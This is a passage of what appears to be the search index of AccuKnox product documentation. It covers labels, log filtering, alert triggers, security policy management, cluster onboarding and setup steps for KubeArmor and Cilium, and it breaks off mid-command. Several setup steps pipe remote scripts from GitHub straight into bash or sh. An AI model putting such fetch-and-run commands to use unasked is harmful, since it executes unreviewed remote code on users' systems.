users can associate entities.</p>"},{"location":"label_manager/create_label/#from-label-manager","title":"From Label Manager:","text":"<p>After the creation of a new label, the user can associate entities from the existing screen.</p> <p>click <code>+Add Entities</code></p> <p></p> <p>select the desired entities from the window and click <code>Add</code> to associate the created label to the selected entities.</p> <p></p> <p>You can also <code>add entities</code> to previously created labels. select <code>Add Entities</code> from the default screen of the <code>Label Manager</code></p> <p></p>"},{"location":"label_manager/create_label/#from-cluster-manager","title":"From Cluster Manager:","text":"<p>Right-click on any entity such as pods, then click <code>+Add Label</code></p> <p></p> <p>Search the desired label and click <code>Add</code> to associate the entity to the selected label.</p> <p></p> <p>Check newly created label in the label list</p> <p>click <code>Label Manager</code> \u2192 select the new label from the list</p> <p></p>"},{"location":"label_manager/edit_remove_labels/","title":"Edit and Remove the labels","text":""},{"location":"label_manager/edit_remove_labels/#edit-label","title":"Edit label","text":"<ol> <li> <p>click <code>Label Manager</code></p> <p>The list of labels is displayed.</p> <p></p> </li> <li> <p>click right corner <code>More options icon</code> ,then click <code>Edit</code></p> <p></p> </li> </ol>"},{"location":"label_manager/edit_remove_labels/#delete-label","title":"Delete Label","text":"<ol> <li> <p>click <code>Label Manager</code></p> <p>The list of labels is displayed.</p> <p></p> </li> <li> <p>click right corner <code>More options icon</code> ,then click <code>Delete</code></p> <p></p> </li> </ol> <p>Note: If you delete the label, label will be removed from the assocaited entities. </p>"},{"location":"label_manager/overview/","title":"Overview","text":""},{"location":"label_manager/overview/#overview","title":"Overview","text":"<p>This section helps you navigate to the topics of Label Manager. Label manager lists associated policies and entities grouped by labels.</p> <ul> <li> <p>What are labels?</p> </li> <li> <p>View labels and associated entities/policies</p> </li> <li> <p>How to create a new label?</p> </li> <li> <p>Edit and Remove the labels</p> </li> </ul>"},{"location":"label_manager/view_labels/","title":"View labels and associated entities/policies","text":"<p>Label manager lists associated policies and entities grouped by labels.</p> <p>Click <code>Label Manager</code> in the left navigation</p> <p></p> <p>Possible entities can be pod, node, and namespace for Kubernetes. For VM/Bare-metal entities can be instance and Instance group.</p> <p>Associated Policies are the policies that have same label as selector label</p> <p>Select any of the rows to see detailed information about the specific label</p> <p></p>"},{"location":"label_manager/what_are_labels/","title":"What are labels?","text":"<p>Labels are key/value pairs that are attached to objects, such as pods. Labels are intended to be used to specify identifying attributes of objects that are meaningful and relevant to users but do not directly imply semantics to the core system. Labels can be used to organize and to select subsets of objects. Labels can be attached to objects at creation time and subsequently added and modified at any time. Each object can have a set of key/value labels defined. Each Key must be unique for a given object.</p>"},{"location":"logs_summary/logs/","title":"Logs","text":"<p>Logs are the responsive component of Accuknox. Logs are generated in real-time based on certain conditions/rules you configure on the security policies. You will get logs from four different components Network, System, Anomaly Detection, and Data protection.</p>"},{"location":"logs_summary/logs/#filter-logs","title":"Filter Logs","text":""},{"location":"logs_summary/logs/#filter-from-the-drop-down-options","title":"Filter from the drop-down options","text":"<p>Click any drop-down to list its attributes.</p> <p></p> <p>Following are the elements in the drop-down options</p>"},{"location":"logs_summary/logs/#k8s-clustervm","title":"K8s-cluster/VM","text":"<p>To access all the logs from your Kubernetes clusters, select K8s-cluster from the first drop-down menu. Select VM to examine the logs for your virtual machines.</p>"},{"location":"logs_summary/logs/#components","title":"Components","text":"<p>Logs are generated by the four different components. Network, System, Anomaly Detection, and Data Protection.</p> <p>The logs are generated based on certain conditions/rules you configured on the policies. The logs and policies are coupled together in a way that a log will be created once the policy is invoked.</p> <p>To filter the logs events occurred by the invoked network policies, select component type to <code>Network</code></p> <p>Similarly, you can filter log events from the system, anomaly detection, and data protection components.</p> <p><code>Anomaly detection</code> monitors workloads based on their historical behaviors, and a log is generated when they deviate from the expected pattern.</p>"},{"location":"logs_summary/logs/#cluster","title":"Cluster","text":"<p><code>cluster</code> drop-down can be used to filter logs related to specific clusters</p>"},{"location":"logs_summary/logs/#namespace","title":"Namespace","text":"<p><code>Namespace</code> drop-down can be used to filter logs related to specific namespaces</p>"},{"location":"logs_summary/logs/#severity","title":"Severity","text":"<p>Use the appropriate options to filter log events by Critical, High, Medium, Low, and Info level of severity, corresponding to the levels defined in the relevant runtime Policies.</p>"},{"location":"logs_summary/logs/#time-ranges","title":"Time Ranges","text":"<p>As in the rest of the platform interface, the time range can be set by date ranges and in increments from 5 minutes to 60 days.</p>"},{"location":"logs_summary/logs/#filter-using-elements-from-the-log-events-list","title":"Filter using elements from the log events list","text":"<p>Click one or more elements in a log event to add them directly to the filter.</p> <p></p> <p>Click <code>Save</code> button, to save the selected filter to <code>Saved Filters</code></p> <p></p>"},{"location":"logs_summary/logs/#directly-search-elements-in-the-filter","title":"Directly search elements in the filter","text":"<p>You can directly search by the elements, such as \u201cCluster_name\u201d, \u201cFlow_IP_destination\u201d etc visible in the logs.</p> <p></p>"},{"location":"logs_summary/logs/#use-search-filters","title":"Use Search Filters","text":"<p>Search Filters are categorized into three</p> <ol> <li> <p>Predefined filters: A set of predefined filters makes the user's log filtering easier. We have incorporated frequent and important elements into these filters.</p> <p></p> </li> <li> <p>Saved Filters: The saved filters will list all the filters that the user has saved.</p> </li> <li> <p>Unsaved: A set of filters loaded from your cache. It will be available shortly.</p> </li> </ol>"},{"location":"logs_summary/logs/#channel-integrations","title":"Channel Integrations","text":"<ul> <li>Slack</li> <li>Splunk</li> <li>Cloudwatch</li> <li>Elastic</li> <li>JiRA</li> </ul>"},{"location":"logs_summary/logs/#log-detail-panel","title":"Log Detail Panel","text":"<p>Click one of the events in the log to view the details pane.</p> <p>The Log Detail contents vary depending on the selected component type of the log event.</p> <p></p>"},{"location":"logs_summary/overview/","title":"Overview","text":"<p>The Logs summary in Accuknox displays a complete list of log events that have occurred within the infrastructure during a defined timeline.</p> <p>select <code>Logs Summary</code> in the left navigation</p> <p></p> <p>It provides an interface to:</p> <ul> <li> <p>Find and get insights into security events in your infrastructure</p> </li> <li> <p>Filter the logs to hone into the events that will require further inspection</p> </li> <li> <p>Inspect any specific event using a log detail panel</p> </li> <li> <p>Sent customized alerts to third-party SIEM (security information and event management) platforms and logging tools, such as Slack, Splunk, Elastic Search, Cloud watch, Jira with the help of trigger.</p> </li> </ul>"},{"location":"logs_summary/triggers/","title":"Triggers","text":"<p>With the use of triggers, AccuKnox can send alerts to third-party SIEM (security information and event management) platforms and logging tools like Slack, Splunk, Elastic Search, Cloud Watch, and Jira.</p>"},{"location":"logs_summary/triggers/#how-to-create-a-new-trigger","title":"How to create a new trigger?","text":"<ol> <li> <p>After choosing specific log filter from the Logs Screen, click on <code>Create Trigger</code> button. You can either click elements directly from the log events list, search for elements directly in the filter, or use Search Filters to choose a specific log filter</p> </li> <li> <p>Configure the required options:</p> <p></p> </li> </ol> <p>Name: Define an alert trigger name.</p> <p>When to initiate this trigger: Set the frequency of the trigger. You have four options to select, (1) Runtime as it happens (2) Once a day (3) Once a week (4) Once a month</p> <p>Define Threat Level: Define the threat level for the trigger. You have three options (1) High (2) Medium (3) Low</p> <p>Selected Filter: The chosen log filter from step 1 is populated here. You can shift to predefined filters from here also.</p> <p>Notification channel: Choose the notification channel that should receive the alerts.</p> <p>Note: Before selecting the notification channel, you should complete the  channel integration for this channel. Review the Channel Integration for more context.  Channel Integration Guide</p> <ol> <li>Click <code>Save</code> button to store the trigger in database.</li> </ol>"},{"location":"logs_summary/triggers/#manage-triggers","title":"Manage Triggers","text":"<p>Triggers can be managed individually, or as a group, by using the checkboxes on the left side of the Trigger UI. Select individual/group of triggers and perform actions, such as enabling, disabling, or deleting.</p> <p></p>"},{"location":"logs_summary/triggers/#view-trigger-details","title":"View Trigger Details","text":"<p>To view Trigger alert details, click the <code>Details</code> of corresponding Tigger alert row. This will give query info of the selected trigger additionally.</p> <p></p>"},{"location":"logs_summary/triggers/#enabledisable-triggers","title":"Enable/Disable Triggers","text":"<p>Alerts can be enabled or disabled using the slider or the actions drop-down menu. You can perform these operations on a single trigger or on multiple triggers</p> <ol> <li> <p>From the Triggers UI, check the boxes beside the relevant triggers.</p> </li> <li> <p>Click <code>Actions</code> drop-down</p> </li> <li> <p>Click Enable or Disable as necessary.</p> </li> </ol> <p>Use the slider beside the trigger to disable or enable individual triggers</p>"},{"location":"logs_summary/triggers/#edit-an-existing-trigger","title":"Edit an Existing Trigger","text":"<p>To edit an existing Tigger alert:</p> <ol> <li> <p>click <code>Edit</code> from the right corner <code>More options</code> icon of the corresponding trigger alert</p> <p></p> </li> <li> <p>Edit the trigger, and click <code>Save</code> to confirm the changes.</p> </li> </ol>"},{"location":"logs_summary/triggers/#duplicate-a-trigger","title":"Duplicate a Trigger","text":"<p>Triggers can be duplicated so that similar triggers can be created quickly.</p> <ol> <li> <p>Click <code>Duplicate</code> from the right corner <code>More options</code> icon of the corresponding trigger alert</p> </li> <li> <p>Make necessary changes and <code>save</code> the trigger.</p> </li> </ol>"},{"location":"logs_summary/triggers/#delete-trigger","title":"Delete Trigger","text":"<p>Open the Triggers page and use one of the following methods to delete triggers:</p> <p>You can perform delete operation on a single trigger or on multiple triggers</p> <ol> <li> <p>From the Triggers UI, check the boxes beside the relevant triggers.</p> </li> <li> <p>Click <code>Actions</code> drop-down</p> </li> <li> <p>Click <code>Delete</code></p> <p></p> </li> </ol> <p>Click <code>Delete</code> from the right corner <code>More options</code> icon of the corresponding trigger to delete individual trigger</p> <p></p>"},{"location":"manage_policies/manage_policies/","title":"Manage policies","text":""},{"location":"manage_policies/manage_policies/#policy-management-life-cycle","title":"Policy Management Life Cycle","text":"<p>Once you successfully onboarded the cluster. You are good to go.</p> <p>You can create policies from scratch to secure your cloud environment. You can also make use of auto discovered policies and a number of predefined recommended policies.</p>"},{"location":"manage_policies/manage_policies/#overview","title":"Overview","text":"<ol> <li> <p>Create/Add policy</p> </li> <li> <p>Define basic parameters like cluster, namespace etc.</p> </li> <li> <p>Add Rules</p> </li> <li> <p>Approve Policy</p> </li> </ol>"},{"location":"manage_policies/manage_policies/#create-policy-manually","title":"Create Policy Manually:","text":"<p>From two screens you can create/Add Policies.</p>"},{"location":"manage_policies/manage_policies/#add-policy-from-cluster-manager-dashboard","title":"Add Policy from Cluster Manager Dashboard.","text":"<ol> <li> <p>Log in to Accuknox select <code>Cluster Manager Dashboard</code> from the left navigation bar.</p> </li> <li> <p>Right Click on any entity such as node and pod.</p> </li> <li> <p>Select <code>Add Policy</code></p> </li> </ol>"},{"location":"manage_policies/manage_policies/#create-policy-from-policy-manager","title":"Create Policy from Policy Manager","text":"<ol> <li> <p>Log in to Accuknox and select <code>Policy Manager</code> -&gt; <code>All Policies</code></p> </li> <li> <p>On the All Policies page, select <code>Create Policy</code></p> </li> </ol>"},{"location":"manage_policies/manage_policies/#define-basic-policy-parameters","title":"Define basic policy parameters","text":"<p>Define the basic parameters of the policy before adding the rules.</p> <p></p> <ul> <li> <p>Policy Name</p> <ul> <li>Name of the Policy</li> </ul> </li> <li> <p>Description</p> <ul> <li>Description for the Policy</li> </ul> </li> <li> <p>Policy Type</p> <ul> <li> <p>Policy Type can be Network-Ingress, Network-Egress and System. Ingress-Policy will apply to all network packets which are entering the endpoint. Egress-Policy will apply to all network packets which are leaving the endpoint. System Policy will restrict behavior at system level.</p> </li> <li> <p>To set up the network security select policy type to be Network-ingress or Network-egress.</p> </li> </ul> </li> <li> <p>Namespace</p> <ul> <li>Namespace will tell in which namespace that policy is going to apply.</li> </ul> </li> <li> <p>Default/Node</p> <ul> <li>This is used to differentiate between Endpoint Selector(default) and Node Selector(Node). It is called Endpoint Selector because it only applies to labels associated with an Endpoint. Node Selector applies to labels associated with a node in the cluster.</li> </ul> </li> <li> <p>Labels</p> <ul> <li>Labels are used to select specified endpoints (in most cases it will be pods) and nodes.</li> </ul> </li> </ul>"},{"location":"manage_policies/manage_policies/#createadd-network-policy","title":"Create/Add Network Policy","text":"<p>To set up the network security policies select policy type to be Network-ingress or Network-egress when you define policy type. </p> <p>select <code>Create/Add Policy</code> -&gt; <code>Policy type</code> -&gt; <code>Network-ingress/Network-egress</code></p>"},{"location":"manage_policies/manage_policies/#createadd-kubearmorsystem-policy","title":"Create/Add Kubearmor(System) Policy","text":"<p>To set up the application security policies select policy type to be System when you define policy type. </p> <p>select <code>Create/Add Policy</code> \u2192 <code>Policy type</code> -&gt; <code>System</code></p>"},{"location":"manage_policies/manage_policies/#add-rules","title":"Add Rules","text":"<p>Once the Policy has been created, You will be directed to the Add rules screen.</p> <p>Another way is to select Policy Manager \u2192 All Policies. Selecting a policy from All Policies list page will expand the policy details and access <code>+</code> icon to add rules.</p> <p>The Add rule interface provides an easy way to add rules to or remove rules from a Policy; Rules will differ based on your policy type you chose.</p> <p>See also: Policies and Rules</p>"},{"location":"manage_policies/manage_policies/#approve-policy","title":"Approve Policy","text":"<p>After you add the rules to policy, Policy will be shifted to <code>Pending</code> state. Then to make it active, you need to approve the policy.</p> <ol> <li> <p>Select <code>Policy Manager</code> -&gt; <code>Pending Approval</code></p> </li> <li> <p>On the Pending Approval list page, <code>Approve</code> your specific policy.</p> </li> <li> <p>Go to <code>Policy Manager</code> -&gt; <code>All Policies</code> list page, You can see recently approved policy with status <code>active</code>.</p> </li> </ol>"},{"location":"manage_policies/manage_policies/#edit-policy","title":"Edit Policy","text":"<p>Select a row in the All policies list to expand the policy details and access the <code>+</code>icon to <code>Edit</code> the policy by adding new rules.</p> <p>You can also edit/delete the existing rules by accessing the three dots icon appearing on the right end of specific rules.</p>"},{"location":"manage_policies/manage_policies/#delete-policy","title":"Delete Policy","text":"<ol> <li> <p>Select <code>Policy Manager</code> -&gt; <code>All Policies</code></p> </li> <li> <p>Click three dot icon on the right end of a specific row.</p> </li> <li> <p>Click <code>Delete Policy</code>.</p> </li> </ol>"},{"location":"manage_policies/manage_policies/#auto-discovered-policies","title":"Auto discovered policies","text":"<p>Auto Discovery is a policy recommendation system that suggests network and system policies based on the collected network and system logs respectively.</p> <p>You can review and apply the auto discovered policies.</p> <p>Applying auto discovered network policies will strengthen your network security.</p> <ol> <li> <p>Select Policy Manager \u2192 Auto Discovered Policies</p> </li> <li> <p>On the Auto Discovered Policies list page, you can filter out different types of policies.</p> </li> <li> <p>Select one or more policies by ticking the rows.</p> </li> <li> <p>Select <code>Action</code> -&gt; <code>Apply</code></p> </li> <li> <p>Select <code>Policy Manager</code> -&gt; <code>Pending Approval</code> -&gt; <code>Approve</code></p> </li> </ol> <p>See also: Auto Discovered Policies</p>"},{"location":"manage_policies/manage_policies/#recommended-policies","title":"Recommended policies","text":"<p>Accuknox provides a number of out-of-the-box recommended policies based on popular workloads or for the host. These policies are recommended to you only after analyzing your workloads and hosts.</p> <p>These policies will cover known CVEs and attack vectors, compliance frameworks (such as MITRE, PCI-DSS, STIG, etc.) and many more.</p> <ol> <li> <p>Select <code>Policy Manager</code> -&gt; <code>Recommended Policies</code></p> </li> <li> <p>On the Recommended Policies list page, You can see all the recommended policies based on your workloads and hosts.</p> </li> <li> <p>Select one or more policies, the click <code>Apply</code></p> </li> <li> <p>On the <code>Apply</code> page, selector labels will be preselected associated with your workloads. You can review labels and if you want to change the labels you can also do it. Selector labels will decide where selected policies are going to apply.</p> </li> <li> <p>After Apply; Select <code>Policy Manager</code> -&gt; <code>Pending Approval</code> -&gt; <code>Approve</code></p> </li> </ol>"},{"location":"onboarding/installation/","title":"Onboarding","text":"<p>This guide describes the deployment of AccuKnox agents in various environments:</p> <ul> <li> <p>Kubernetes </p> </li> <li> <p>Virtual Machine   [coming soon]  </p> </li> </ul>"},{"location":"onboarding/onboarding/","title":"Onboarding steps","text":"<p>Step 1: Log in to AccuKnox SaaS as Admin and select <code>Workspace Manager &gt; Oboarding &gt; Cluster onboard &gt; onboard now&gt; Select your Cloud account</code>.   </p> <p>Step 2: Select the service provider from the dropdown.</p> <p> </p> <p>Step 3: Select the Region/Zone where the cluster is running   </p> <p> </p> <p>Step 4: Enter the cluster name which you want to onboard into SaaS platform and click on Save &amp; Next. </p> <p> </p> <p>Step 5: Copy the code snippet under List of Agents to deploy necessary agents required into your Kubernetes cluster. </p> <p> </p> <p>Tip: To copy/paste the commands follow these steps</p> <p>Step 6: Verify service status </p> <p>Check Troubleshooting in case of permissions or conflict errors. </p>"},{"location":"onboarding/pre-requisites/","title":"Pre-requisites","text":"<p>It is assumed that the user has some basic familiarity with Kubernetes, kubectl and helm.</p> <p>It also assumes that you are familiar with the AccuKnox opensource tool workflow. If you're new to AccuKnox itself, refer first to Getting Started.</p> <p>It is recommended to have the following configured before onboarding:</p> <ol> <li>Kubectl</li> <li>Helm</li> </ol>"},{"location":"onboarding/pre-requisites/#minimum-resource-required","title":"Minimum Resource required","text":"<p>A Kubernetes cluster with</p> <ul> <li>Number of Nodes : 3</li> <li>Machine Type: e2-standard-2    </li> <li>Total vCPUs : 6</li> <li>Total Memory: 24GB</li> </ul>"},{"location":"onboarding/sign-up/","title":"Sign-Up","text":"<p>Sign-Up &amp; Workspace Creation</p> <ol> <li>Visit  https://app.accuknox.com to begin the process of Sign Up. To create an AccuKnox account, Click on the Sign-Up button. </li> <li>Enter the required details to get started.  A verification email will be sent on the given email ID. </li> <li>Login in to your mail, click on the link &amp; verify the account. </li> <li>Once the account has been verified, which is a one time process, you\u2019ll be asked to create workspace. </li> <li>Enter the workspace details, click on the submit. </li> <li>Select the workspace in which you want to onboard the Cluster/VM. If you want, can create multiple workspaces here. </li> <li>Follow the steps to onboard the Cluster/VM to the selected workspace</li> </ol>"},{"location":"onboarding/verify-service-gke/","title":"Verify Service Status","text":"<p>Log in to AccuKnox SaaS and check that each module you deployed is functioning. It may take 2 minutes or so for events to be collected and displayed.</p>"},{"location":"onboarding/verify-service-gke/#check-overall-connection-status","title":"Check Overall Connection Status","text":"<ul> <li>Cluster Manager: Select Cluster Manager from the menu to see all connected Kubernetes clusters.</li> </ul>"},{"location":"onboarding/verify-service-gke/#check-agent-status","title":"Check Agent Status","text":"<p>Connect to the cluster via terminal and use the following command to check the agent status <pre><code>kubectl get po -A | egrep 'kubearmor|cilium|hubble|shared|knox|feeder'\n</code></pre></p> Sample Output <pre><code>accuknox-agents   feeder-service-5cccc87cbb-bzq74                               1/1     Running                      0          23s\naccuknox-agents   shared-informer-agent-79ffd76cbc-xxqpx                        1/1     Running                      0          1m\nkube-system       cilium-46vlh                                                  1/1     Running                      0          5m\nkube-system       cilium-bt484                                                  1/1     Running                      0          5m\nkube-system       cilium-hrqxj                                                  1/1     Running                      0          5m\nkube-system       cilium-j92jt                                                  1/1     Running                      0          5m\nkube-system       cilium-node-init-4nmqn                                        1/1     Running                      0          5m\nkube-system       cilium-node-init-5sdl2                                        1/1     Running                      0          5m\nkube-system       cilium-node-init-f8zwb                                        1/1     Running                      0          5m\nkube-system       cilium-node-init-x4hwc                                        1/1     Running                      0          5m\nkube-system       cilium-operator-8675b564b4-6b6tq                              1/1     Running                      0          5m\nkube-system       cilium-operator-8675b564b4-lrrlp                              1/1     Running                      0          5m\nkube-system       hubble-relay-74b76459f9-vvs44                                 1/1     Running                      0          3m\nkube-system       kubearmor-d95gl                                               1/1     Running                      0          3m\nkube-system       kubearmor-fwsc5                                               1/1     Running                      0          3m\nkube-system       kubearmor-host-policy-manager-69cfc96948-nss27                2/2     Running                      0          3m\nkube-system       kubearmor-policy-manager-986bd8dbc-b47n4                      2/2     Running                      0          3m\nkube-system       kubearmor-q64h7                                               1/1     Running                      0          3m\nkube-system       kubearmor-relay-645667c695-d96g8                              1/1     Running                      0          3m\nkube-system       kubearmor-sh6fb                                               1/1     Running                      0          3m\n</code></pre>"},{"location":"open-source/","title":"Setup Instructions","text":""},{"location":"open-source/#1-install-sample-k8s-cluster","title":"1. Install sample k8s cluster","text":"Local k3s clusterEKS cluster <p>Install k3s</p> <pre><code>curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC='--flannel-backend=none --disable traefik' sh -s - --write-kubeconfig-mode 644\n</code></pre> <p>Make k3s cluster config the default</p> <pre><code>export KUBECONFIG=/etc/rancher/k3s/k3s.yaml\nor\ncp /etc/rancher/k3s/k3s.yaml ~/.kube/config\n</code></pre> <pre><code>apiVersion: eksctl.io/v1alpha5\nkind: ClusterConfig\n\nmetadata:\n  name: kubearmor-ub20\n  region: us-east-2\n\nnodeGroups:\n  - name: ng-1\n    amiFamily: \"Ubuntu2004\"\n    privateNetworking: true\n    desiredCapacity: 2\n    # taint nodes so that application pods are\n    # not scheduled until Cilium is deployed.\n    taints:\n     - key: \"node.cilium.io/agent-not-ready\"\n       value: \"true\"\n       effect: \"NoSchedule\"\n    ssh:\n      allow: true\n    preBootstrapCommands:\n      - \"sudo apt install linux-headers-$(uname -r)\"\n</code></pre>"},{"location":"open-source/#2-install-daemonsets-and-services","title":"2. Install Daemonsets and Services","text":"<p><pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash\n</code></pre> This will install all the components.</p> Output from kubectl get pods -A <pre><code>NAMESPACE     NAME                                             READY   STATUS      RESTARTS   AGE\nkube-system   helm-install-traefik-crd-gwlpt                   0/1     Completed   0          3h17m\nkube-system   helm-install-traefik-lzkqg                       0/1     Completed   1          3h17m\nkube-system   svclb-traefik-47bc4                              2/2     Running     2          3h9m\nkube-system   metrics-server-86cbb8457f-cw9jd                  1/1     Running     1          3h9m\nkube-system   local-path-provisioner-7c7846d5f8-kxdxj          1/1     Running     1          3h3m\nkube-system   coredns-7448499f4d-qk6pv                         1/1     Running     0          15m\nkube-system   traefik-5ffb8d6846-w8clc                         1/1     Running     1          3h3m\nkube-system   cilium-operator-6bbdb895b5-ff752                 1/1     Running     0          12m\nkube-system   hubble-relay-84999fcb48-8d5ss                    1/1     Running     0          11m\nkube-system   cilium-wkgzn                                     1/1     Running     0          11m\nexplorer      mysql-0                                          1/1     Running     0          10m\nkube-system   kubearmor-67jtk                                  1/1     Running     0          8m34s\nkube-system   kubearmor-policy-manager-986bd8dbc-4s79d         2/2     Running     0          8m34s\nkube-system   kubearmor-host-policy-manager-5bcccfc4f5-gkbck   2/2     Running     0          8m34s\nkube-system   kubearmor-relay-645667c695-brzpg                 1/1     Running     0          8m34s\nexplorer      knoxautopolicy-6bf6c98dbb-pfwt9                  1/1     Running     0          8m20s\n</code></pre> <p>We have following installed:</p> <ul> <li>kubearmor protection engine</li> <li>cilium CNI</li> <li>Auto policy discovery engine</li> <li>MySQL database to keep discovered policies</li> <li>Hubble Relay and KubeArmor Relay</li> </ul>"},{"location":"open-source/#3-install-sample-k8s-application","title":"3. Install Sample k8s application","text":"<p>Install anyone of the following app or you can try your own k8s app.</p> Wordpress-Mysql AppOnline Boutique: Google Microservice Demo App <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/main/examples/wordpress-mysql/wordpress-mysql-deployment.yaml\n</code></pre> <p>Application Reference</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/GoogleCloudPlatform/microservices-demo/master/release/kubernetes-manifests.yaml\n</code></pre>"},{"location":"open-source/#4-get-auto-discovered-policies","title":"4. Get Auto Discovered Policies","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash\n</code></pre> Sample Output <pre><code>\u276f curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash\n{\n  \"res\": \"ok\"\n}\nGot 172 cilium policies in file cilium_policies.yaml\n{\n  \"res\": \"ok\"\n}\nGot 1 kubearmor policies in file kubearmor_policies_default_default_main_ipidmpgu.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_redis_nqnohcbu.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_bujjgiip.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_gihaqkqo.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_gmlefyvh.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_gpcrbwsg.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_gvmixduf.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_jimxunhp.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_rxpzliwy.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_sbvldmly.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_uxvdiqid.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_default_server_wsglnafl.yaml\n</code></pre>"},{"location":"open-source/#5-applying-auto-discovered-policies-on-cluster","title":"5. Applying Auto Discovered Policies on Cluster","text":"<p>These policies can then be applied on the k8s cluster running KubeArmor and Cilium.</p> <ul> <li>Apply policies using <code>kubectl apply -f checkoutservice.yaml</code>.</li> </ul> Sample Output <pre><code>kubectl apply -f kubearmor_policies.yaml\nkubearmorpolicy.security.kubearmor.com/autopol-explorer-mysql created\n</code></pre> <ul> <li>To check KubeArmor policies one can use respective CRD's like <code>ksp</code>(KubeArmorSecurityPolicy CRD), <code>hsp</code>(KubeArmorHostSecurityPolicy CRD) for KubeArmor and <code>cnp</code>(CiliumNetworkPolicy CRD) for Cilium.</li> </ul> Output from kubectl get ksp -A <pre><code>NAMESPACE         NAME                          AGE\nspringboot        do-not-allow-exec-from-java   12m\ndefault           ksp-log4j-block               10h\ndefault           allow-only-ls                 26m\nwordpress-mysql   ksp-wordpress-block-config    12h\n\n    # Similarly one can use hsp &amp; cnp\n</code></pre>"},{"location":"open-source/#6-uninstall","title":"6. Uninstall","text":"<pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/uninstall.sh | bash\n</code></pre> Output Summary <pre><code>    We have following Uninstalled:\n\n    * KubeArmor Protection Engine and associated CRDs\n    * Cilium CNI\n    * Auto Policy Discovery Engine\n    * MySQL Database to keep Auto Discovered Policies\n    * Hubble Relay and KubeArmor Relay\n</code></pre>"},{"location":"open-source/#siem-integration","title":"SIEM Integration","text":"<ol> <li>Integration Guide</li> </ol>"},{"location":"open-source/auto-policy-generation/","title":"Auto policy generation","text":""},{"location":"open-source/auto-policy-generation/#policy-auto-discovery","title":"Policy Auto Discovery","text":"<p>Accuknox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Cilium to auto-generate network and system policies.</p> <p></p>"},{"location":"open-source/auto-policy-generation/#using-policy-discovery","title":"Using Policy Discovery","text":"<p>KnoxAutoPolicy Service is installed along with other control plane elements. <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/knoxAutoPolicy-deployment/6834f042b396bd4002bfaaf31a87f4b46af10442/k8s/deployment.yaml\n</code></pre></p>"},{"location":"open-source/auto-policy-generation/#fetch-auto-discovered-policies","title":"Fetch Auto Discovered Policies","text":"<p>The auto discovered policies could be kept in a MySQL DB or can be created as simple YAML files in the knoxAutoPolicy service pod. There is a script provided that can identify the knoxAutoPolicy service pod and pull the discovered policies.</p> <pre><code>./get_discovered_yamls.sh\n</code></pre> <p>Sample output: <pre><code>\u276f ./get_discovered_yamls.sh\nDownloading discovered policies from pod=knoxautopolicy-74f5b5d65b-tv7v7\nGot 9 cilium policies for namespace=explorer in file cilium_policies_explorer.yaml\nGot 5 cilium policies for namespace=kube-system in file cilium_policies_kube-system.yaml\nGot 2 cilium policies for namespace=spire in file cilium_policies_spire.yaml\nGot 9 knox policies for namespace=explorer in file knox_policies_explorer.yaml\nGot 5 knox policies for namespace=kube-system in file knox_policies_kube-system.yaml\nGot 2 knox policies for namespace=spire in file knox_policies_spire.yaml\n</code></pre></p> <p>Internally the script using <code>kubectl cp</code> to copy the discovered YAML files from the knoxAutoPolicy service pods.</p>"},{"location":"open-source/cilium-install/","title":"Cilium: Deployment Guide","text":""},{"location":"open-source/cilium-install/#deployment-steps-for-cilium-hubble-cli","title":"Deployment Steps for Cilium &amp; Hubble CLI","text":""},{"location":"open-source/cilium-install/#1-download-and-install-cilium-cli","title":"1. Download and install Cilium CLI","text":"<pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/download/v0.10.2/cilium-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check cilium-linux-amd64.tar.gz.sha256sum\nsudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\nrm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"open-source/cilium-install/#2-install-cilium","title":"2. Install Cilium","text":"<p><pre><code>cilium install --agent-image docker.io/accuknox/cilium:latest --operator-image docker.io/accuknox/cilium-operator-generic:latest\n</code></pre> Note: If you are using AWS or Azure managed kubernetes cluster, then change the value of <code>--operator-image</code> option in the above command to <code>docker.io/accuknox/cilium-operator-aws:latest</code> or <code>docker.io/accuknox/cilium-operator-azure:latest</code> respectively.</p> <p>It is assumed that the k8s cluster is already present/reachable and the user has rights to create service-accounts and cluster-role-bindings.</p>"},{"location":"open-source/cilium-install/#3-validate-the-installation","title":"3. Validate the Installation","text":""},{"location":"open-source/cilium-install/#a-optional-to-validate-that-cilium-has-been-properly-installed-you-can-run","title":"a. [Optional] To validate that Cilium has been properly installed, you can run:","text":"<pre><code>cilium status --wait\n</code></pre>"},{"location":"open-source/cilium-install/#b-optional-run-the-following-command-to-validate-that-your-cluster-has-proper-network-connectivity","title":"b. [Optional] Run the following command to validate that your cluster has proper network connectivity:","text":"<p><pre><code>cilium connectivity test\n</code></pre> Congratulations! You have a fully functional Kubernetes cluster with Cilium. \ud83c\udf89</p>"},{"location":"open-source/cilium-install/#4-setting-up-hubble-observability","title":"4. Setting up Hubble Observability","text":""},{"location":"open-source/cilium-install/#a-enable-hubble-in-cilium","title":"a. Enable Hubble in Cilium","text":"<pre><code>cilium hubble enable --relay-image quay.io/cilium/hubble-relay:stable\n</code></pre>"},{"location":"open-source/cilium-install/#b-install-the-hubble-cli-client","title":"b. Install the Hubble CLI Client","text":"<pre><code>export HUBBLE_VERSION=$(curl -s 